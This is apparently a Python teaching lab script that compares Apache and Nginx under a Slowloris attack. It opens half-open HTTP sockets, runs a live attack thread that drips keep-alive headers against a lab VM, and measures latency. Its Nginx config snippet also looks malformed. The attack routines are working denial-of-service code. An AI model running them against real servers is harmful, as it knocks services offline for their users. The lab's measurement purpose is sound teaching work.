"""
====================================================
 slowloris_nginx_compare.py
 AUA CS 232/337 — Apache vs Nginx Slowloris Comparison

 Gap closed: slowloris.py's docstring declares:
   "Key teaching point: Nginx (event-driven) is immune.
    Apache (thread-per-connection) is not."
 but no tool in the project demonstrated this empirically.
 This file implements that experiment.

 Why the difference matters:
   Apache (mpm_prefork / mpm_worker): each open connection
   holds a worker thread or process.  With 150 connections
   that never complete, all 150 workers are blocked.  New
   requests get "503 Service Unavailable" or simply timeout.

   Nginx (event-driven, non-blocking): a single worker
   process handles thousands of concurrent connections via
   an event loop.  Slowloris connections are just idle file
   descriptors — they consume a small amount of RAM and a
   kernel socket slot, but they do NOT block request handling.
   Nginx continues serving legitimate traffic normally.

 Experiment design:
   1. Run --connlimit-test against Apache (port 80) to count
      how many of 150 sockets succeed before the thread pool
      is exhausted — this is the "before" baseline.
   2. Run the same test against Nginx (port 8080 or 443 by
      default in the lab — Nginx can sit on a different port).
   3. Optionally run a brief live attack and measure the
      response latency of a legitimate probe request to each
      server during the attack ("latency under load").
   4. Write comparison JSON for generate_graphs.py.
   5. Print a side-by-side comparison table.

 Nginx setup on the victim VM (192.168.100.20):
   sudo apt-get install nginx
   sudo nginx                            # starts on :80 by default
   # If Apache already owns :80, run Nginx on a different port:
   echo "events{} http{ server{ listen 8080; root /var/www/html; }}" \
       | sudo tee /etc/nginx/sites-enabled/lab.conf
   sudo systemctl reload nginx

 Usage:
   python3 slowloris_nginx_compare.py
   python3 slowloris_nginx_compare.py \
       --apache-ip 192.168.100.20 --apache-port 80 \
       --nginx-ip  192.168.100.20 --nginx-port  8080 \
       --sockets 150 --live-attack --attack-duration 20
====================================================
"""

import argparse
import json
import logging
import socket
import time
import threading
from datetime import datetime
from typing import Optional

logging.basicConfig(
    level=logging.INFO,
    format="[nginx-compare %(asctime)s] %(message)s",
    datefmt="%H:%M:%S",
)

# ── Import the attack machinery from the lab's slowloris.py ───
try:
    from slowloris import create_socket, slowloris as _slowloris_fn
    _SLOWLORIS_AVAILABLE = True
except ImportError:
    _SLOWLORIS_AVAILABLE = False
    logging.warning(
        "slowloris.py not found in the same directory. "
        "connlimit_test() will use an inline implementation."
    )


# ══════════════════════════════════════════════════════════════
#  CONNLIMIT TEST (inline fallback if slowloris.py is absent)
# ══════════════════════════════════════════════════════════════

def _open_half_open_sockets(target_ip: str, target_port: int,
                             num_sockets: int) -> list:
    """
    Open `num_sockets` half-open HTTP connections.
    Returns a list of the successfully connected socket objects.
    """
    import random
    sockets = []
    for _ in range(num_sockets):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        try:
            s.connect((target_ip, target_port))
            s.send(
                f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: Mozilla/5.0 (lab)\r\n"
                f"Accept-language: en-US,en;q=0.5\r\n"
                .encode("utf-8")
            )
            sockets.append(s)
        except socket.error:
            s.close()
    return sockets


def connlimit_test(target_ip: str, target_port: int,
                   num_sockets: int, label: str) -> dict:
    """
    Open `num_sockets` half-open connections, count successes,
    close everything, and return a result dict.
    This is the core measurement the comparison is built on.
    """
    logging.info("[%s] Opening %d half-open sockets to %s:%d",
                 label, num_sockets, target_ip, target_port)
    t0      = time.time()
    sockets = _open_half_open_sockets(target_ip, target_port, num_sockets)
    elapsed = round(time.time() - t0, 2)

    succeeded = len(sockets)
    failed    = num_sockets - succeeded
    pct       = round(succeeded / num_sockets * 100, 1)

    logging.info("[%s] %d/%d succeeded (%.1f%%) in %.2fs",
                 label, succeeded, num_sockets, pct, elapsed)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    return {
        "label":     label,
        "target":    f"{target_ip}:{target_port}",
        "attempted": num_sockets,
        "succeeded": succeeded,
        "failed":    failed,
        "pct_open":  pct,
        "elapsed_s": elapsed,
    }


# ══════════════════════════════════════════════════════════════
#  LATENCY PROBE
# ══════════════════════════════════════════════════════════════

def probe_latency(target_ip: str, target_port: int,
                  n_probes: int = 5) -> dict:
    """
    Send `n_probes` complete HTTP GET requests and measure
    time-to-first-byte (TTFB) for each.  Returns the median,
    min, max, and a list of individual measurements in ms.

    This is the "legitimate user experience" metric: under a
    Slowloris attack, an Apache server will show drastically
    elevated TTFB (or timeouts), while Nginx continues to
    respond quickly.
    """
    times = []
    for _ in range(n_probes):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            t0 = time.time()
            s.connect((target_ip, target_port))
            s.send(
                f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
                f"Connection: close\r\n\r\n".encode("utf-8")
            )
            s.recv(256)   # wait for first byte
            ms = round((time.time() - t0) * 1000, 1)
            times.append(ms)
        except socket.error as e:
            times.append(None)   # timeout or refused → None
        finally:
            s.close()
        time.sleep(0.1)

    valid = [t for t in times if t is not None]
    if not valid:
        return {"median_ms": None, "min_ms": None, "max_ms": None,
                "samples": times, "timeouts": len(times)}

    valid.sort()
    mid = len(valid) // 2
    median = valid[mid] if len(valid) % 2 else (valid[mid-1]+valid[mid])/2
    return {
        "median_ms": median,
        "min_ms":    min(valid),
        "max_ms":    max(valid),
        "samples":   times,
        "timeouts":  times.count(None),
    }


# ══════════════════════════════════════════════════════════════
#  LIVE ATTACK THREAD (optional phase)
# ══════════════════════════════════════════════════════════════

class _AttackThread(threading.Thread):
    """
    Holds a pool of half-open sockets against one target for
    `duration` seconds, dripping keep-alive headers every 10s.
    Used to sustain an active Slowloris load while latency probes
    are fired at both Apache and Nginx simultaneously.
    """

    def __init__(self, target_ip: str, target_port: int,
                 num_sockets: int, duration: int, label: str):
        super().__init__(daemon=True, name=f"attack-{label}")
        self.target_ip   = target_ip
        self.target_port = target_port
        self.num_sockets = num_sockets
        self.duration    = duration
        self.label       = label

    def run(self) -> None:
        import random
        sockets = _open_half_open_sockets(
            self.target_ip, self.target_port, self.num_sockets
        )
        logging.info("[%s] Attack thread: %d sockets open", self.label, len(sockets))
        end = time.time() + self.duration
        while time.time() < end:
            dead = []
            for s in sockets:
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except socket.error:
                    dead.append(s)
            for s in dead:
                sockets.remove(s)
                try: s.close()
                except Exception: pass
            time.sleep(10)
        for s in sockets:
            try: s.close()
            except Exception: pass
        logging.info("[%s] Attack thread finished.", self.label)


# ══════════════════════════════════════════════════════════════
#  MAIN COMPARISON EXPERIMENT
# ══════════════════════════════════════════════════════════════

def run_comparison(
    apache_ip: str, apache_port: int,
    nginx_ip:  str, nginx_port:  int,
    num_sockets:      int  = 150,
    live_attack:      bool = False,
    attack_duration:  int  = 20,
    n_latency_probes: int  = 5,
) -> dict:
    """
    Full comparison experiment:
      Phase 1 — connection-limit test (baseline, no attack running)
      Phase 2 — live attack + latency probe (if --live-attack)
      Phase 3 — results table + JSON output
    """
    results: dict = {
        "timestamp":   datetime.now().isoformat(),
        "num_sockets": num_sockets,
        "apache": {},
        "nginx":  {},
        "conclusion": "",
    }

    # ── Phase 1: connlimit-test (no attack) ───────────────────
    logging.info("═══ Phase 1: connlimit-test (no active attack) ══════════")

    results["apache"]["connlimit"] = connlimit_test(
        apache_ip, apache_port, num_sockets, label="Apache"
    )
    time.sleep(2)   # let sockets fully close before the next test
    results["nginx"]["connlimit"] = connlimit_test(
        nginx_ip, nginx_port, num_sockets, label="Nginx"
    )

    # ── Phase 2: live attack + latency probes ─────────────────
    if live_attack:
        logging.info("═══ Phase 2: live attack — latency under load ════════════")

        # Baseline latency (no attack)
        logging.info("[Apache] Baseline latency (no attack)...")
        results["apache"]["latency_baseline"] = probe_latency(
            apache_ip, apache_port, n_latency_probes
        )
        logging.info("[Nginx] Baseline latency (no attack)...")
        results["nginx"]["latency_baseline"] = probe_latency(
            nginx_ip, nginx_port, n_latency_probes
        )

        # Start Slowloris attack against Apache only
        logging.info(
            "Starting Slowloris attack against Apache (%s:%d) for %ds...",
            apache_ip, apache_port, attack_duration,
        )
        apache_attacker = _AttackThread(
            apache_ip, apache_port, num_sockets, attack_duration, "Apache-attack"
        )
        apache_attacker.start()

        time.sleep(3)   # let the attack establish its socket pool

        logging.info("[Apache] Latency UNDER ATTACK...")
        results["apache"]["latency_under_attack"] = probe_latency(
            apache_ip, apache_port, n_latency_probes
        )
        logging.info("[Nginx]  Latency while Apache is under attack (control)...")
        results["nginx"]["latency_control"] = probe_latency(
            nginx_ip, nginx_port, n_latency_probes
        )

        # Wait for attack to end, then start against Nginx
        apache_attacker.join(timeout=attack_duration + 5)

        logging.info(
            "Starting Slowloris attack against Nginx (%s:%d) for %ds...",
            nginx_ip, nginx_port, attack_duration,
        )
        nginx_attacker = _AttackThread(
            nginx_ip, nginx_port, num_sockets, attack_duration, "Nginx-attack"
        )
        nginx_attacker.start()
        time.sleep(3)

        logging.info("[Nginx] Latency UNDER ATTACK...")
        results["nginx"]["latency_under_attack"] = probe_latency(
            nginx_ip, nginx_port, n_latency_probes
        )
        logging.info("[Apache] Latency while Nginx is under attack (control)...")
        results["apache"]["latency_control"] = probe_latency(
            apache_ip, apache_port, n_latency_probes
        )

        nginx_attacker.join(timeout=attack_duration + 5)

    # ── Phase 3: print and save results ───────────────────────
    _print_comparison(results, live_attack)
    _write_results(results)
    return results


def _print_comparison(results: dict, live_attack: bool) -> None:
    """Print a side-by-side comparison table."""
    a = results["apache"]
    n = results["nginx"]
    ac = a["connlimit"]
    nc = n["connlimit"]

    print()
    print("═" * 62)
    print("  Slowloris: Apache vs Nginx — Comparison")
    print("═" * 62)
    print(f"  {'Metric':<36} {'Apache':>10} {'Nginx':>10}")
    print("  " + "─" * 58)
    print(f"  {'Target':<36} {ac['target']:>10} {nc['target']:>10}")
    print(f"  {'Sockets attempted':<36} {ac['attempted']:>10} {nc['attempted']:>10}")
    print(f"  {'Sockets succeeded (half-open)':<36} "
          f"{ac['succeeded']:>10} {nc['succeeded']:>10}")
    print(f"  {'Success % (connection exhaustion)':<36} "
          f"{ac['pct_open']:>9.1f}% {nc['pct_open']:>9.1f}%")

    if live_attack:
        def ms(d, key):
            v = d.get(key, {}).get("median_ms")
            return f"{v:.0f}ms" if v is not None else "TIMEOUT"

        print()
        print(f"  {'Latency baseline (no attack)':<36} "
              f"{ms(a, 'latency_baseline'):>10} "
              f"{ms(n, 'latency_baseline'):>10}")
        print(f"  {'Latency UNDER ATTACK':<36} "
              f"{ms(a, 'latency_under_attack'):>10} "
              f"{ms(n, 'latency_under_attack'):>10}")
        print(f"  {'Timeouts under attack':<36} "
              f"{a.get('latency_under_attack',{}).get('timeouts','?'):>10} "
              f"{n.get('latency_under_attack',{}).get('timeouts','?'):>10}")

    print()
    print("  CONCLUSION:")
    a_pct = ac["pct_open"]
    n_pct = nc["pct_open"]
    if n_pct > a_pct + 20:
        verdict = (
            f"  Apache accepted {a_pct:.0f}% of Slowloris sockets — its thread\n"
            f"  pool was exhausted. Nginx accepted {n_pct:.0f}% — its event-driven\n"
            f"  architecture holds connections as idle file descriptors\n"
            f"  without blocking request processing. This confirms the\n"
            f"  teaching point: Nginx is structurally resistant to Slowloris."
        )
    elif n_pct <= a_pct + 5:
        verdict = (
            f"  Both servers accepted similar numbers of sockets ({a_pct:.0f}% vs\n"
            f"  {n_pct:.0f}%). Verify that Apache's connection limit is NOT set\n"
            f"  higher than Nginx's worker_connections, or that both servers\n"
            f"  are running their default thread/event-loop configurations."
        )
    else:
        verdict = (
            f"  Apache: {a_pct:.0f}% | Nginx: {n_pct:.0f}%. Partial immunity gap\n"
            f"  observed. Check Nginx worker_connections setting."
        )
    print(verdict)
    results["conclusion"] = verdict.strip()
    print()
    print("═" * 62)


def _write_results(results: dict) -> None:
    path = "slowloris_nginx_compare_results.json"
    with open(path, "w") as f:
        json.dump(results, f, indent=2)
    logging.info("Results saved: %s  (use generate_graphs.py to plot)", path)


# ══════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════

def main() -> None:
    p = argparse.ArgumentParser(
        description="Slowloris: Apache vs Nginx immunity comparison — AUA CS 232/337"
    )
    p.add_argument("--apache-ip",   default="192.168.100.20",
                   help="Apache target IP (default: 192.168.100.20)")
    p.add_argument("--apache-port", type=int, default=80,
                   help="Apache port (default: 80)")
    p.add_argument("--nginx-ip",    default="192.168.100.20",
                   help="Nginx target IP (default: 192.168.100.20)")
    p.add_argument("--nginx-port",  type=int, default=8080,
                   help="Nginx port (default: 8080)")
    p.add_argument("--sockets",     type=int, default=150,
                   help="Half-open sockets to attempt (default: 150)")
    p.add_argument("--live-attack", action="store_true",
                   help="Run a brief live Slowloris attack and measure "
                        "latency under load for both servers")
    p.add_argument("--attack-duration", type=int, default=20,
                   help="Seconds to sustain live attack per server (default: 20)")
    p.add_argument("--latency-probes", type=int, default=5,
                   help="Number of latency probe requests per measurement (default: 5)")
    args = p.parse_args()

    run_comparison(
        apache_ip        = args.apache_ip,
        apache_port      = args.apache_port,
        nginx_ip         = args.nginx_ip,
        nginx_port       = args.nginx_port,
        num_sockets      = args.sockets,
        live_attack      = args.live_attack,
        attack_duration  = args.attack_duration,
        n_latency_probes = args.latency_probes,
    )


if __name__ == "__main__":
    main()
